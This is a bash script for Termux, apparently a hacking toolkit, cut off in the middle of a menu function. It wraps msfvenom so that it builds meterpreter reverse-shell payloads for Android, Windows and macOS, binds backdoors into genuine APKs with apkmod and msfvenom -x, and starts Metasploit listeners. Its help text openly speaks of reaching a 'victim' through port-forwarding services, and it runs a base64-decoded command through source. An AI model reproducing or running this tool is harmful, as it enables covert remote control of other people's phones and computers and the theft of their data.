#!/bin/bash -e
#MrGhostOfficial[NetHunter]
#Binary_: 01010011 01101111 01101101 01110010 01100001 01100001 01110100
#Mystylecustommodifiedcolorcode*
#Normal below are the colors
white='\033[1;37m'
red='\033[1;31m'
yellow='\033[1;33m'
green='\033[1;32m'
purple='\033[1;35m'
black='\033[1;30m'
blue='\033[1;34m'
cyan='\033[1;36m'
finished='\e[0m'
#Lite below are the colors
whitelite='\033[0;37m'
redlite='\033[0;31m'
yellowlite='\033[0;33m'
greenlite='\033[0;32m'
purplelite='\033[0;35m'
blacklite='\033[0;30m'
bluelite='\033[0;34m'
cyanlite='\033[0;36m'
#To mix below are the colors
greenredmix='\033[1;32;41m'
whiteredmix='\033[1;37;41m'
bluemix='\033[1;37;44m'
bluewhitemix='\033[0;37;44m'
purplewhitemix='\033[0;37;45m'
#×××××××××××××××××××××××××××××××××××:
function checkinternet(){
clear
toilet -f smmono9 "Need-Internet" | lolcat
echo -e "${red} [${yellow}¥${red}] ${white}First Disconnect Any Connected VPN${finished}\n"
sleep 3
echo -e "${red} [${yellow}✔️${red}] ${blue}Checking your Internet Connection${redlite}...${finished}"
sleep 2
echo -e ""
ping -c 1 google.com > /dev/null 2>&1
if [[ "$?" != 0 ]]
 then
    echo -e "${yellow} [${red}-${yellow}] ${green}Internet: ${red}FAILED${finished}\n"
    sleep 2
    echo -e "${yellow} ${white}[${cyan}+${white}] ${cyanlite}This Script Need ${greenlite}Active ${cyanlite}Internet Connection${finished}"
    sleep 2
    echo -e ""
    echo -e "${redlite}               ${greenlite}Not-Connected ${redlite}Exit${finished}\n"
    sleep 2
    exit
  else
    echo -e "${red} [${green}√${red}] ${yellow}Internet:${green} CONNECTED\n${finished}"
    sleep 2
    echo -e "${yellow} ${white}[${green}+${white}] ${cyan}Please wait redirecting${redlite}...${finished}"
    sleep 5
  fi
}
#Binary_: 01010011 01101111 01101101 01110010 01100001 01100001 01110100
spinner () {
#!/bin/bash
local pid=$!
local delay=0.25
local spinner=( '█■■■■' '■█■■■' '■■█■■' '■■■█■' '■■■■█' )

while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do

for i in "${spinner[@]}"
do
	tput civis
	echo -ne "${bluelite}\r[${yellowlite}❢${bluelite}]${greenredmix}Downloading${redlite}..${greenlite}Please wait${redlite}.......${yellowlite}[${greenlite}$i${yellowlite}]${finished}   ";
	sleep $delay
	printf "\b\b\b\b\b\b\b\b";
done
done
printf "   \b\b\b\b\b"
tput cnorm
printf "${greenlite} ${redlite}[${greenlite}Done!${redlite}]${finished}";
echo "";
}
#Binary_: 01010011 01101111 01101101 01110010 01100001 01100001 01110100
spinner2(){
#!/bin/bash
sleep 20 & PID=$! #simulate a long process
echo -e "IT MAY TAKE SOME TIME, BE PATIENT${redlite}...${finished}"
printf "${redlite}["
# While process is running...
while kill -0 $PID 2> /dev/null; do 
    printf  "${greenlite}▓"
    sleep 1
done
printf "${redlite}] ${white}done${redlite}!${finished}"
echo ''
}
#Binary_: 01010011 01101111 01101101 01110010 01100001 01100001 01110100
function main_menu(){
echo -e "${finished}"
createfolder='/sdcard/HTTPNET'
if [ ! -d $createfolder ];
then
  mkdir $createfolder
fi
clear;reset
source <(echo 'anAyYSAtLWNvbG9ycyAiJFBSRUZJWC9zaGFyZS9pZ2hvc3QvLi4uIgo=' | base64 -d)
echo -e "${black} —————————————————— ${red}[${green}INFORMATION${red}] ${black}———————————————————>
${red} [${green}✓${red}] ${white}Creator ${red}: ${white}MrGhostOfficial${redlite}[${yellowlite}NetHunter${redlite}]
${red} [${green}✓${red}] ${white}YouTube ${red}: ${purple}HackerFake424
${red} [${green}✓${red}] ${white}Support ${red}: ${cyan}Nethantara CyberCoder TeM
${red} [${green}✓${red}] ${white}GitHub  ${red}: ${green}https://github.com/${yellowlite}Mr${whitelite}Ghost${greenlite}Official\n ${black}————————————————————————————————————————————————————>"
echo -e "               ${bluewhitemix}First Use Function${finished}"
echo -e "          ${red}[${white}i${red}] ${green}All Pkg${redlite}-${green}Installations\n${finished}"
echo -e "${red}[${white}1${red}] ${yellow}Generate Payload ${redlite}(${yellow}Normal${redlite})\n${finished}"
echo -e "${red}[${white}2${red}] ${yellow}Inject Payload in Original Apk\n${finished}"
echo -e "${red}[${white}3${red}] ${yellow}Decompile${redlite}+${yellow}Recompile${redlite}+${yellow}Signing Apk\n${finished}"
echo -e "${red}[${white}4${red}] ${yellow}Start Metasploit Listener\n${finished}"
echo -e "${red}[${white}5${red}] ${yellow}ighoststart Control Panel ${redlite}(${yellow}Server${redlite})\n${finished}"
echo -e "              ${purplewhitemix}Function/Exalted${finished}"
echo -e "          ${red}[${white}s${red}] ${blue}Your${bluelite}All${blue}File ${redlite}(${blue}S${bluelite}&${blue}C${redlite})\n${finished}"
echo -e "${red}[${white}u${red}] ${whitelite}Latest Update ${red}[${white}e${red}] ${greenlite}Exit tool ${red}[${white}t${red}] ${bluelite}Telegram Us\n${finished}"
echo -e "${black}---------------+${finished}"
echo -n -e "[ッ]${whiteredmix}Write Enter${finished}${black}:${redlite}> ${white}"
read type
case $type in
     i) clear
        Allpkgs_install
        exit 0
     ;;
     1) clear
        payload_tool
     ;;
     2) clear
        injectpayload
     ;;
     3) clear
        dec_rec_sig_apk
     ;;   
     4) clear
        metasploitlistener
     ;;   
     5) clear
        ighoststart_server
        exit 0
     ;;
     s) clear
        allfsaved
     ;;
     u) clear
        reset
        update
     ;;
     t) clear
        reset
        telegram
     ;;
     e) clear
        logout_menu
     ;;
     *) echo
        echo -e " ${whitelite}[${redlite}~${whitelite}] ${bluelite}Wrong ${cyanlite}Input ${bluelite}Try ${cyanlite}Again${redlite}.${finished}"
        sleep 3
        main_menu
     ;;
esac
}
#Binary_: 01010011 01101111 01101101 01110010 01100001 01100001 01110100
function Allpkgs_install(){
clear
figlet "PermissioN" | lolcat
echo -e ""
echo -e "${yellow}[${red}+${yellow}] ${blue}>> ${greenredmix}ALL BASIC DOWNLOAD REQUIREMENTS${finished} ${blue}>>${finished}"
sleep 2
echo -e ""
echo -e "${bluelite}[${greenlite}i${bluelite}] ${redlite}>> ${greenlite}if you facing ${yellowlite}apt update ${redlite}issues ${greenlite}then connect us server vpn and try manually ${yellowlite}apt update -y${finished}"
apt update -y;apt install jp2a -y;apt install cowsay -y;apt install neofetch -y;apt install wget -y;apt install curl -y;rm -rf $PREFIX/share/ighost;mkdir $PREFIX/share/ighost;cd ~/ANDroidPAY/AGITFOLDER;cp -rf ... ...txt $PREFIX/share/ighost &> /dev/null & spinner2
echo -e ""
echo -e "${bluelite}[${greenlite}i${bluelite}] ${redlite}>> ${greenlite}npm install -g express${finished}"
tar -xvzf ~/ANDroidPAY/AGITFOLDER/server.tar.gz;rm -rf $HOME/ANDroidPAY/AGITFOLDER/server.tar.gz
cd $HOME/ANDroidPAY/AGITFOLDER/server;npm install;npm install -g express &> /dev/null & spinner2
echo -e ""
echo "rm $PREFIX/bin/ighoststart;cd $HOME/ANDroidPAY/AGITFOLDER/server/;node index.js" > ighoststart;chmod +x ighoststart;mv -v ighoststart $PREFIX/bin
rm -rf $PREFIX/share/ighost/ghostbusters.cow;curl -OL https://raw.githubusercontent.com/MrGhostOfficial/Allin1Images/master/ghostbusters.cow;mv -v ghostbusters.cow $PREFIX/share/ighost
clear
cd $HOME;neofetch --ascii_distro Arch
echo -e "    ${yellowlite}MrGhost👻\n${redlite}[${yellowlite}i${redlite}] ${greenlite}All Successfully installed${finished}\n"
cd $HOME/ANDroidPAY;ls
echo -e "\n"
}
#Binary_: 01010011 01101111 01101101 01110010 01100001 01100001 01110100
function payload_tool(){
echo -e "${finished}"
clear;reset
toilet -f smmono9 "Select OptioN" | lolcat
echo -e " ${red}+${yellow}———${black}———${yellow}———${black}———${red}[ ${green}Secondary~Menu${red} ]${yellow}———${black}———${yellow}———${black}———${red}+${finished}"
echo -e "  ${cyanlite}| ${red}[${white}1${red}] ${yellow}Payload for Android                 ${cyanlite}|\n     ${black}|${finished}"
echo -e "  ${black}| ${red}[${white}2${red}] ${yellow}Payload for Windows                 ${black}|\n     ${black}|${finished}"
echo -e "  ${cyanlite}| ${red}[${white}3${red}] ${yellow}Payload for MacOs                   ${cyanlite}|\n     ${black}|${finished}"
echo -e "  ${black}| ${red}[${white}4${red}] ${yellow}Script Coming Soon${redlite}..                ${black}|\n     ${black}|${finished}"
echo -e "  ${cyanlite}| ${red}[${white}0${red}] ${yellow}Go Back Menu                        ${cyanlite}|${finished}"
echo -e "  ${red}+${black}——${yellow}——${black}——${yellow}———${black}———${yellow}———${black}———${yellow}———${black}———${yellow}———${black}———${yellow}———${black}———${yellow}———${black}——${red}+${finished}\n"
echo -n -e "[ッ]${whiteredmix}Write Enter${finished}${black}:${redlite}> ${white}"
read type
case $type in
      1) android_payload_menu
      ;;
      2) window_payload_menu
      ;;
      3) mac_payload
      ;;
      4) reset
      payload_tool
      ;;
      0) main_menu
      ;;
      *) echo
         echo -e " ${whitelite}[${redlite}~${whitelite}] ${bluelite}Wrong ${cyanlite}Input ${bluelite}Try ${cyanlite}Again${redlite}.${finished}"
         sleep 3
         payload_tool
      ;;
esac
}
#Binary_: 01010011 01101111 01101101 01110010 01100001 01100001 01110100
function lhost(){
echo -e "${white} Enter LocalHost${red}(${white}your net ip or public ip${red})"
echo -e "${yellow} Assign Localhost ${red}(${yellow}ex${red}:${green}127.0.0.1${red}) "
echo -n -e "${red} [${green}LHOST${red}]${cyan}: ${white}"
read lhost
}
function lport(){
echo -e "${white} Enter Local Port${red}(${white}your wish or public use${red})"
echo -e "${yellow} Assign Local Port ${red}(${yellow}ex${red}:${green}22222${red}) "
echo -n -e "${red} [${green}LPORT${red}]${cyan}: ${white}"
read lport
}
function pname(){
echo -n -e "${red} [${green}㌹${red}] ${yellow}Assign a Name ${red}(${white}ex${red}:${green}Spy${red}) ${red}:> ${cyan}"
read name
}
#Binary_: 01010011 01101111 01101101 01110010 01100001 01100001 01110100
function android_payload_menu(){
echo -e "${finished}"
clear;reset
toilet -f smmono9 "Select OptioN" | lolcat
echo -e " ${red}+${yellow}———${black}———${yellow}———${black}———${red}[ ${green}Secondary~Menu${red} ]${yellow}———${black}———${yellow}———${black}———${red}+${finished}"
echo -e "  ${cyanlite}| ${red}[${white}1${red}] ${yellow}android/meterpreter/reverse_tcp     ${cyanlite}|\n     ${black}|${finished}"
echo -e "  ${black}| ${red}[${white}2${red}] ${yellow}android/meterpreter/reverse_http    ${black}|\n     ${black}|${finished}"
echo -e "  ${cyanlite}| ${red}[${white}3${red}] ${yellow}android/meterpreter/reverse_https   ${cyanlite}|\n     ${black}|${finished}"
echo -e "  ${black}| ${red}[${white}4${red}] ${yellow}Script Coming Soon${redlite}..                ${black}|\n     ${black}|${finished}"
echo -e "  ${cyanlite}| ${red}[${white}0${red}] ${yellow}Go Back Menu                        ${cyanlite}|${finished}"
echo -e "  ${red}+${black}——${yellow}——${black}——${yellow}———${black}———${yellow}———${black}———${yellow}———${black}———${yellow}———${black}———${yellow}———${black}———${yellow}———${black}——${red}+${finished}\n"
echo -n -e "[ッ]${whiteredmix}Write Enter${finished}${black}:${redlite}> ${white}"
read type
case $type in
      1) android_payload
      ;;
      2) android_payload2
      ;;
      3) android_payload3
      ;;
      4) reset
      android_payload_menu
      ;;
      0) main_menu
      ;;
      *) echo
         echo -e " ${whitelite}[${redlite}~${whitelite}] ${bluelite}Wrong ${cyanlite}Input ${bluelite}Try ${cyanlite}Again${redlite}.${finished}"
         sleep 3
         android_payload_menu
      ;;
esac
}
#Binary_: 01010011 01101111 01101101 01110010 01100001 01100001 01110100
function android_payload(){
clear;reset;neofetch --ascii_distro Android
echo -e "${black}+————————————————${red}[ ${green}Generate Payload ${red}]${black}————————————————+"
echo -e "${red}[${green}INFO${red}]${cyan} In the Generate Payload you need ip address${redlite}, ${cyan}you can check here your ip${redlite}, ${cyan}fast one is your public ip And 2nd one local ip${redlite}, ${cyan}this two ip give you access only if you & your victim connected with same hotspot or wifi${redlite}, ${cyan}if your victim using own mobile data${redlite}, ${cyan}then you need use portmap.io OpenVPN.ovpn ip address Enjoy${redlite}.🐌${finished}\n${whitelite}Name${redlite}: ${yellowlite}OpenVPN Android.apk${finished}\n${whitelite}Link${redlite}-:${greenlite}https://bit.ly/44C7Nsq${finished}\n${whitelite}Site${redlite}: ${yellowlite}Portmap.io${finished}\n${whitelite}Link${redlite}-:${greenlite}https://portmap.io/register${finished}"
echo -e "${black}+————————————————————————————————————————————————————+${finished}"
echo -e "${bluewhitemix}Public IP Address${finished}${green}\n"
wget -qO- ifconfig.me
echo -e "\n${black}×————————————————————————————————————————————————————×${finished}"
echo -e ""
lhost
echo -e ""
lport
echo -e ""
echo -e ""
pname
echo -e ""
echo -e "${red} [${green}∆${red}] ${yellow}Please wait process is running${white}...${finished}"
msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport --platform android R -o $PREFIX/share/AllSavedFile/Payload/$name.apk > /dev/null 2>&1
echo -e "${red} [${green}#${red}] ${green}Your Payload Generated Successfully${finished}"
backmenu
}
#Binary_: 01010011 01101111 01101101 01110010 01100001 01100001 01110100
function android_payload2(){
clear;reset;neofetch --ascii_distro Android
echo -e "${black}+————————————————${red}[ ${green}Generate Payload ${red}]${black}————————————————+"
echo -e "${red}[${green}INFO${red}]${cyan} In the Generate Payload you need ip address${redlite}, ${cyan}you can check here your ip${redlite}, ${cyan}fast one is your public ip And 2nd one local ip${redlite}, ${cyan}this two ip give you access only if you & your victim connected with same hotspot or wifi${redlite}, ${cyan}if your victim using own mobile data${redlite}, ${cyan}then you need use portmap.io OpenVPN.ovpn ip address Enjoy${redlite}.🐌${finished}\n${whitelite}Name${redlite}: ${yellowlite}OpenVPN Android.apk${finished}\n${whitelite}Link${redlite}-:${greenlite}https://bit.ly/44C7Nsq${finished}\n${whitelite}Site${redlite}: ${yellowlite}Portmap.io${finished}\n${whitelite}Link${redlite}-:${greenlite}https://portmap.io/register${finished}"
echo -e "${black}+————————————————————————————————————————————————————+${finished}"
echo -e "${bluewhitemix}Public IP Address${finished}${green}\n"
wget -qO- ifconfig.me
echo -e "\n${black}×————————————————————————————————————————————————————×${finished}"
echo -e ""
lhost
echo -e ""
lport
echo -e ""
echo -e ""
pname
echo -e ""
echo -e "${red} [${green}∆${red}] ${yellow}Please wait process is running${white}...${finished}"
msfvenom -p android/meterpreter/reverse_http LHOST=$lhost LPORT=$lport --platform android R -o $PREFIX/share/AllSavedFile/Payload/$name.apk > /dev/null 2>&1
echo -e "${red} [${green}#${red}] ${green}Your Payload Generated Successfully${finished}"
backmenu
}
#Binary_: 01010011 01101111 01101101 01110010 01100001 01100001 01110100
function android_payload3(){
clear;reset;neofetch --ascii_distro Android
echo -e "${black}+————————————————${red}[ ${green}Generate Payload ${red}]${black}————————————————+"
echo -e "${red}[${green}INFO${red}]${cyan} In the Generate Payload you need ip address${redlite}, ${cyan}you can check here your ip${redlite}, ${cyan}fast one is your public ip And 2nd one local ip${redlite}, ${cyan}this two ip give you access only if you & your victim connected with same hotspot or wifi${redlite}, ${cyan}if your victim using own mobile data${redlite}, ${cyan}then you need use portmap.io OpenVPN.ovpn ip address Enjoy${redlite}.🐌${finished}\n${whitelite}Name${redlite}: ${yellowlite}OpenVPN Android.apk${finished}\n${whitelite}Link${redlite}-:${greenlite}https://bit.ly/44C7Nsq${finished}\n${whitelite}Site${redlite}: ${yellowlite}Portmap.io${finished}\n${whitelite}Link${redlite}-:${greenlite}https://portmap.io/register${finished}"
echo -e "${black}+————————————————————————————————————————————————————+${finished}"
echo -e "${bluewhitemix}Public IP Address${finished}${green}\n"
wget -qO- ifconfig.me
echo -e "\n${black}×————————————————————————————————————————————————————×${finished}"
echo -e ""
lhost
echo -e ""
lport
echo -e ""
echo -e ""
pname
echo -e ""
echo -e "${red} [${green}∆${red}] ${yellow}Please wait process is running${white}...${finished}"
msfvenom -p android/meterpreter/reverse_https LHOST=$lhost LPORT=$lport --platform android R -o $PREFIX/share/AllSavedFile/Payload/$name.apk > /dev/null 2>&1
echo -e "${red} [${green}#${red}] ${green}Your Payload Generated Successfully${finished}"
backmenu
}
#Binary_: 01010011 01101111 01101101 01110010 01100001 01100001 01110100
function window_payload_menu(){
echo -e "${finished}"
clear;reset
toilet -f smmono9 "Select OptioN" | lolcat
echo -e " ${red}+${yellow}———${black}———${yellow}———${black}———${red}[ ${green}Secondary~Menu${red} ]${yellow}———${black}———${yellow}———${black}———${red}+${finished}"
echo -e "  ${cyanlite}| ${red}[${white}1${red}] ${yellow}android/meterpreter/reverse_tcp     ${cyanlite}|\n     ${black}|${finished}"
echo -e "  ${black}| ${red}[${white}2${red}] ${yellow}android/meterpreter/reverse_http    ${black}|\n     ${black}|${finished}"
echo -e "  ${cyanlite}| ${red}[${white}3${red}] ${yellow}android/meterpreter/reverse_https   ${cyanlite}|\n     ${black}|${finished}"
echo -e "  ${black}| ${red}[${white}4${red}] ${yellow}Script Coming Soon${redlite}..                ${black}|\n     ${black}|${finished}"
echo -e "  ${cyanlite}| ${red}[${white}0${red}] ${yellow}Go Back Menu                        ${cyanlite}|${finished}"
echo -e "  ${red}+${black}——${yellow}——${black}——${yellow}———${black}———${yellow}———${black}———${yellow}———${black}———${yellow}———${black}———${yellow}———${black}———${yellow}———${black}——${red}+${finished}\n"
echo -n -e "[ッ]${whiteredmix}Write Enter${finished}${black}:${redlite}> ${white}"
read type
case $type in
      1) window_payload
      ;;
      2) window_payload2
      ;;
      3) window_payload3
      ;;
      4) reset
      window_payload_menu
      ;;
      0) main_menu
      ;;
      *) echo
         echo -e " ${whitelite}[${redlite}~${whitelite}] ${bluelite}Wrong ${cyanlite}Input ${bluelite}Try ${cyanlite}Again${redlite}.${finished}"
         sleep 3
         window_payload_menu
      ;;
esac
}
#Binary_: 01010011 01101111 01101101 01110010 01100001 01100001 01110100
function window_payload(){
clear;reset;neofetch --ascii_distro Arch_old
echo -e "${black}+————————————————${red}[ ${green}Generate Payload ${red}]${black}————————————————+"
echo -e "${red}[${green}INFO${red}]${cyan} In the Generate Payload you need ip address${redlite}, ${cyan}you can check here your ip${redlite}, ${cyan}fast one is your public ip And 2nd one local ip${redlite}, ${cyan}this two ip give you access only if you & your victim connected with same hotspot or wifi${redlite}, ${cyan}if your victim using own mobile data${redlite}, ${cyan}then you need use portmap.io OpenVPN.ovpn ip address Enjoy${redlite}.🐌${finished}\n${whitelite}Name${redlite}: ${yellowlite}OpenVPN Android.apk${finished}\n${whitelite}Link${redlite}-:${greenlite}https://bit.ly/44C7Nsq${finished}\n${whitelite}Site${redlite}: ${yellowlite}Portmap.io${finished}\n${whitelite}Link${redlite}-:${greenlite}https://portmap.io/register${finished}"
echo -e "${black}+————————————————————————————————————————————————————+${finished}"
echo -e "${bluewhitemix}Public IP Address${finished}${green}\n"
wget -qO- ifconfig.me
echo -e "\n${black}×————————————————————————————————————————————————————×${finished}"
echo -e ""
lhost
echo -e ""
lport
echo -e ""
echo -e ""
pname
echo -e ""
echo -e "${red} [${green}∆${red}] ${yellow}Please wait process is running${white}...${finished}"
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe > $PREFIX/share/AllSavedFile/Payload/$name.exe > /dev/null 2>&1
echo -e "${red} [${green}#${red}] ${green}Your Payload Generated Successfully${finished}"
backmenu
}
#Binary_: 01010011 01101111 01101101 01110010 01100001 01100001 01110100
function window_payload2(){
clear;reset;neofetch --ascii_distro Arch_old
echo -e "${black}+————————————————${red}[ ${green}Generate Payload ${red}]${black}————————————————+"
echo -e "${red}[${green}INFO${red}]${cyan} In the Generate Payload you need ip address${redlite}, ${cyan}you can check here your ip${redlite}, ${cyan}fast one is your public ip And 2nd one local ip${redlite}, ${cyan}this two ip give you access only if you & your victim connected with same hotspot or wifi${redlite}, ${cyan}if your victim using own mobile data${redlite}, ${cyan}then you need use portmap.io OpenVPN.ovpn ip address Enjoy${redlite}.🐌${finished}\n${whitelite}Name${redlite}: ${yellowlite}OpenVPN Android.apk${finished}\n${whitelite}Link${redlite}-:${greenlite}https://bit.ly/44C7Nsq${finished}\n${whitelite}Site${redlite}: ${yellowlite}Portmap.io${finished}\n${whitelite}Link${redlite}-:${greenlite}https://portmap.io/register${finished}"
echo -e "${black}+————————————————————————————————————————————————————+${finished}"
echo -e "${bluewhitemix}Public IP Address${finished}${green}\n"
wget -qO- ifconfig.me
echo -e "\n${black}×————————————————————————————————————————————————————×${finished}"
echo -e ""
lhost
echo -e ""
lport
echo -e ""
echo -e ""
pname
echo -e ""
echo -e "${red} [${green}∆${red}] ${yellow}Please wait process is running${white}...${finished}"
msfvenom -p windows/meterpreter/reverse_http LHOST=$lhost LPORT=$lport -f exe > $PREFIX/share/AllSavedFile/Payload/$name.exe > /dev/null 2>&1
echo -e "${red} [${green}#${red}] ${green}Your Payload Generated Successfully${finished}"
backmenu
}
#Binary_: 01010011 01101111 01101101 01110010 01100001 01100001 01110100
function window_payload3(){
clear;reset;neofetch --ascii_distro Arch_old
echo -e "${black}+————————————————${red}[ ${green}Generate Payload ${red}]${black}————————————————+"
echo -e "${red}[${green}INFO${red}]${cyan} In the Generate Payload you need ip address${redlite}, ${cyan}you can check here your ip${redlite}, ${cyan}fast one is your public ip And 2nd one local ip${redlite}, ${cyan}this two ip give you access only if you & your victim connected with same hotspot or wifi${redlite}, ${cyan}if your victim using own mobile data${redlite}, ${cyan}then you need use portmap.io OpenVPN.ovpn ip address Enjoy${redlite}.🐌${finished}\n${whitelite}Name${redlite}: ${yellowlite}OpenVPN Android.apk${finished}\n${whitelite}Link${redlite}-:${greenlite}https://bit.ly/44C7Nsq${finished}\n${whitelite}Site${redlite}: ${yellowlite}Portmap.io${finished}\n${whitelite}Link${redlite}-:${greenlite}https://portmap.io/register${finished}"
echo -e "${black}+————————————————————————————————————————————————————+${finished}"
echo -e "${bluewhitemix}Public IP Address${finished}${green}\n"
wget -qO- ifconfig.me
echo -e "\n${black}×————————————————————————————————————————————————————×${finished}"
echo -e ""
lhost
echo -e ""
lport
echo -e ""
echo -e ""
pname
echo -e ""
echo -e "${red} [${green}∆${red}] ${yellow}Please wait process is running${white}...${finished}"
msfvenom -p windows/meterpreter/reverse_https LHOST=$lhost LPORT=$lport -f exe > $PREFIX/share/AllSavedFile/Payload/$name.exe > /dev/null 2>&1
echo -e "${red} [${green}#${red}] ${green}Your Payload Generated Successfully${finished}"
backmenu
}
#Binary_: 01010011 01101111 01101101 01110010 01100001 01100001 01110100
function mac_payload(){
clear;reset;neofetch --ascii_distro Arch_old
echo -e "${black}+————————————————${red}[ ${green}Generate Payload ${red}]${black}————————————————+"
echo -e "${red}[${green}INFO${red}]${cyan} In the Generate Payload you need ip address${redlite}, ${cyan}you can check here your ip${redlite}, ${cyan}fast one is your public ip And 2nd one local ip${redlite}, ${cyan}this two ip give you access only if you & your victim connected with same hotspot or wifi${redlite}, ${cyan}if your victim using own mobile data${redlite}, ${cyan}then you need use portmap.io OpenVPN.ovpn ip address Enjoy${redlite}.🐌${finished}\n${whitelite}Name${redlite}: ${yellowlite}OpenVPN Android.apk${finished}\n${whitelite}Link${redlite}-:${greenlite}https://bit.ly/44C7Nsq${finished}\n${whitelite}Site${redlite}: ${yellowlite}Portmap.io${finished}\n${whitelite}Link${redlite}-:${greenlite}https://portmap.io/register${finished}"
echo -e "${black}+————————————————————————————————————————————————————+${finished}"
echo -e "${bluewhitemix}Public IP Address${finished}${green}\n"
wget -qO- ifconfig.me
echo -e "\n${black}×————————————————————————————————————————————————————×${finished}"
echo -e ""
lhost
echo -e ""
lport
echo -e ""
echo -e ""
pname
echo -e ""
echo -e "${red} [${green}∆${red}] ${yellow}Please wait process is running${white}...${finished}"
msfvenom -p osx/x86/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f macho > $PREFIX/share/AllSavedFile/Payload/$name.macho > /dev/null 2>&1
echo -e "${red} [${green}#${red}] ${green}Your Payload Generated Successfully${finished}"
backmenu
}
#Binary_: 01010011 01101111 01101101 01110010 01100001 01100001 01110100
function injectpayload(){
echo -e "${finished}"
clear;reset
toilet -f smmono9 "Select OptioN" | lolcat
echo -e " ${red}+${yellow}———${black}———${yellow}———${black}———${red}[ ${green}Secondary~Menu${red} ]${yellow}———${black}———${yellow}———${black}———${red}+${finished}"
echo -e "  ${cyanlite}| ${red}[${white}1${red}] ${yellow}Apkmod binding original apk         ${cyanlite}|\n     ${black}|${finished}"
echo -e "  ${black}| ${red}[${white}2${red}] ${yellow}Msfvenom -x binding original apk    ${black}|\n     ${black}|${finished}"
echo -e "  ${cyanlite}| ${red}[${white}3${red}] ${yellow}Script Coming Soon${redlite}..                ${cyanlite}|\n     ${black}|${finished}"
echo -e "  ${black}| ${red}[${white}0${red}] ${yellow}Go Back Menu                        ${black}|${finished}"
echo -e "  ${red}+${black}——${yellow}——${black}——${yellow}———${black}———${yellow}———${black}———${yellow}———${black}———${yellow}———${black}———${yellow}———${black}———${yellow}———${black}——${red}+${finished}\n"
echo -n -e "[ッ]${whiteredmix}Write Enter${finished}${black}:${redlite}> ${white}"
read type
case $type in
      1) apkmod_bind
      ;;
      2) msfvenom_bind
      ;;
      3) reset
      injectpayload
      ;;
      0) main_menu
      ;;
      *) echo
         echo -e " ${whitelite}[${redlite}~${whitelite}] ${bluelite}Wrong ${cyanlite}Input ${bluelite}Try ${cyanlite}Again${redlite}.${finished}"
         sleep 3
         injectpayload
      ;;
esac
}
#Binary_: 01010011 01101111 01101101 01110010 01100001 01100001 01110100
function apkmod_bind(){
clear;reset;neofetch --ascii_distro Android
echo -e "${black}+————————————————${red}[ ${green}Generate Payload ${red}]${black}————————————————+"
echo -e "${red}[${green}INFO${red}]${cyan} In the bind payload you need ip address${redlite}, ${cyan}you can check here your ip${redlite}, ${cyan}fast one is your public ip And 2nd one local ip${redlite}, ${cyan}this two ip give you access only if you & your victim connected with same hotspot or wifi${redlite}, ${cyan}if your victim using own mobile data${redlite}, ${cyan}then you need use portmap.io OpenVPN.ovpn ip address Enjoy${redlite}.🐌${finished}\n${whitelite}Name${redlite}: ${yellowlite}OpenVPN Android.apk${finished}\n${whitelite}Link${redlite}-:${greenlite}https://bit.ly/44C7Nsq${finished}\n${whitelite}Site${redlite}: ${yellowlite}Portmap.io${finished}\n${whitelite}Link${redlite}-:${greenlite}https://portmap.io/register${finished}"
echo -e "${black}+————————————————————————————————————————————————————+${finished}"
echo -e "${bluewhitemix}Public IP Address${finished}${green}\n"
wget -qO- ifconfig.me
echo -e "\n${black}×————————————————————————————————————————————————————×${finished}"
echo -e ""
#Apkmod Bind Backdoor
read -p "[*] Enter FilepathApk#~: " path
read -p "[*] Enter Lhost#~: " lhost
read -p "[*] Enter Lport#~: " lport
echo -e "${yellowlite}[*] Reverse Engineering Started${whitelite}..;${yellowlite}p\e[0m"
echo -e "${yellowlite}[*] Please wait process is running${whitelite}...${finished}"
apkmod -b -i $path -o $PREFIX/share/AllSavedFile/Payload/bind_pyload.apk lhost=$lhost lport=$lport
}
#Binary_: 01010011 01101111 01101101 01110010 01100001 01100001 01110100
function msfvenom_bind(){
clear;reset;neofetch --ascii_distro Android
echo -e "${black}+————————————————${red}[ ${green}Generate Payload ${red}]${black}————————————————+"
echo -e "${red}[${green}INFO${red}]${cyan} In the bind payload you need ip address${redlite}, ${cyan}you can check here your ip${redlite}, ${cyan}fast one is your public ip And 2nd one local ip${redlite}, ${cyan}this two ip give you access only if you & your victim connected with same hotspot or wifi${redlite}, ${cyan}if your victim using own mobile data${redlite}, ${cyan}then you need use portmap.io OpenVPN.ovpn ip address Enjoy${redlite}.🐌${finished}\n${whitelite}Name${redlite}: ${yellowlite}OpenVPN Android.apk${finished}\n${whitelite}Link${redlite}-:${greenlite}https://bit.ly/44C7Nsq${finished}\n${whitelite}Site${redlite}: ${yellowlite}Portmap.io${finished}\n${whitelite}Link${redlite}-:${greenlite}https://portmap.io/register${finished}"
echo -e "${black}+————————————————————————————————————————————————————+${finished}"
echo -e "${bluewhitemix}Public IP Address${finished}${green}\n"
wget -qO- ifconfig.me
echo -e "\n${black}×————————————————————————————————————————————————————×${finished}"
echo -e ""
#Apkmod Bind Backdoor
read -p "[*] Enter FilepathApk#~: " path
read -p "[*] Enter Lhost#~: " lhost
read -p "[*] Enter Lport#~: " lport
echo -e "${yellowlite}[*] Reverse Engineering Started${whitelite}..;${yellowlite}p\e[0m"
echo -e "${yellowlite}[*] Please wait process is running${whitelite}...${finished}"
msfvenom -x $path -p android/meterpreter/reverse_tcp lhost=$lhost lport=$lport R> $PREFIX/share/AllSavedFile/Payload/bind_pyload.apk
}
#Binary_: 01010011 01101111 01101101 01110010 01100001 01100001 01110100
function dec_rec_sig_apk(){
echo -e "${finished}"
clear;reset
toilet -f smmono9 "Select OptioN" | lolcat
echo -e " ${red}+${yellow}———${black}———${yellow}———${black}———${red}[ ${green}Secondary~Menu${red} ]${yellow}———${black}———${yellow}———${black}———${red}+${finished}"
echo -e "  ${cyanlite}| ${red}[${white}1${red}] ${yellow}Apkmod using decompiling apk        ${cyanlite}|\n     ${black}|${finished}"
echo -e "  ${black}| ${red}[${white}2${red}] ${yellow}Apkmod using recompiling apk        ${black}|\n     ${black}|${finished}"
echo -e "  ${cyanlite}| ${red}[${white}3${red}] ${yellow}Apkmod using signing apk            ${cyanlite}|\n     ${black}|${finished}"
echo -e "  ${black}| ${red}[${white}4${red}] ${yellow}Script Coming Soon${redlite}..                ${black}|\n     ${black}|${finished}"
echo -e "  ${cyanlite}| ${red}[${white}0${red}] ${yellow}Go Back Menu                        ${cyanlite}|${finished}"
